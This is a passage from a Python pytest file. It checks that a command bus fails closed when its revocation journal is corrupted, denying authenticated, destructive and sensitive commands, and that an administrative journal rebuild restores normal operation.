    journal_file = tmp_path / "fail_closed_routing.journal"
    journal_file.write_text("corrupted_line\n", encoding="utf-8")

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE, PermissionTier.SENSITIVE},
        require_session=False,
        revocation_journal_path=journal_file,
    )
    assert bus._security_fail_closed is True

    # 1. Unauthenticated read-only command executes
    read_res = await bus.execute("list_running_apps")
    assert read_res.status is CommandStatus.SUCCESS

    # 2. Authenticated command is DENIED
    auth_res = await bus.execute("list_running_apps", session_id="any_session_token")
    assert auth_res.status is CommandStatus.DENIED
    assert "fail-closed" in auth_res.error.lower()

    # 3. Sensitive / destructive commands are DENIED even if unauthenticated
    destr_res = await bus.execute("delete_file", {"path": "/tmp/serein/test.txt"})
    assert destr_res.status is CommandStatus.DENIED
    assert "fail-closed" in destr_res.error.lower()

    sens_res = await bus.execute("network_request", {"url": "https://example.com"})
    assert sens_res.status is CommandStatus.DENIED
    assert "fail-closed" in sens_res.error.lower()


@pytest.mark.asyncio
async def test_administrative_recovery_procedure_restores_operation(tmp_path):
    """
    Administrative recovery (recover_journal(force_rebuild=True)):
    - Archives corrupted journal
    - Re-initializes clean verified journal with 0o600 permissions
    - Reconciles state with SQLite
    - Clears fail-closed security state and restores normal operation
    """
    db_file = tmp_path / "admin_rec.db"
    journal_file = tmp_path / "admin_rec.db.revocations"
    db = Database(path=db_file)
    await db.connect()

    # Corrupt journal deliberately
    journal_file.write_text("GARBAGE_TORN_ENTRY_123\n", encoding="utf-8")

    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
        database=db,
        revocation_journal_path=journal_file,
    )
    assert bus._security_fail_closed is True

    # Authenticated operations denied while fail-closed
    user = f"admin_rec_user_{int(time.time())}"
    token = await bus.authenticate(user, "ValidSecurePass123!")
    # Token cannot be authenticated while fail-closed
    assert token is None
    res = await bus.execute("list_running_apps", session_id="attempt_token")
    assert res.status is CommandStatus.DENIED

    # Perform administrative recovery
    recovered = await bus.recover_journal(force_rebuild=True)
    assert recovered is True
    assert bus._security_fail_closed is False
    assert bus._fail_closed_reason is None

    # Clean journal now exists and has proper header
    assert journal_file.exists()
    assert "# SEREIN_REVOCATION_JOURNAL_V1" in journal_file.read_text(encoding="utf-8")

    # Now authentication and operations succeed
    valid_token = await get_test_authenticated_session(bus, username=user)
    assert valid_token is not None
    assert await bus._is_valid_session(valid_token) is True

    exec_res = await bus.execute("list_running_apps", session_id=valid_token)
    assert exec_res.status is CommandStatus.SUCCESS

    await db.close()
